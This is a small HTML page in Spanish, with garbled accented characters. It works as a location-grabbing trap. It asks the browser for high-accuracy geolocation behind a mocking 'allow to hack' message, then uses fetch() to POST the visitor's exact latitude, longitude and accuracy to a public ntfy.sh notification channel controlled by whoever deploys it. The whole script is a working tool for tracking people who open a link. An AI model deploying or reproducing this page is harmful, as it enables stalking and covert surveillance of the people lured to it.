<!DOCTYPE html>
<html lang="es-Zeta">
<head>
  <meta charset="UTF-8">
  <title>ZetaGeoCrudo</title>
  <style>
    body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh}
    #msg{font-size:1.5rem;text-align:center}
  </style>
</head>
<body>
  <div id="msg">Dale a permitir para hackear, cabrÃ³n ðŸ‘½</div>

  <script>
    const ntfyUrl = "https://ntfy.sh/byhertzdelt8999";   // <-- tu canal aquÃ­

    function mandaTexto(pos) {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      const acc = pos.coords.accuracy.toFixed(0);
      const texto = `ZetaGeo: lat=${lat}, lon=${lon}, acc=${acc}m`;
      fetch(ntfyUrl, {
        method: "POST",
        body: texto,
        headers: {"Content-Type": "text/plain"}
      })
      .then(() => { document.getElementById("msg").innerText = "UbicaciÃ³n hackear, jefe ðŸ›°ï¸"; })
      .catch(e => { document.getElementById("msg").innerText = "Fallo al enviar: " + e; });
    }

    function errorHandler(err) {
      document.getElementById("msg").innerText = "Permiso denegado o error: " + err.message;
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(mandaTexto, errorHandler, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    } else {
      document.getElementById("msg").innerText = "GeolocalizaciÃ³n no soportada ðŸ’€";
    }
  </script>
</body>
</html>
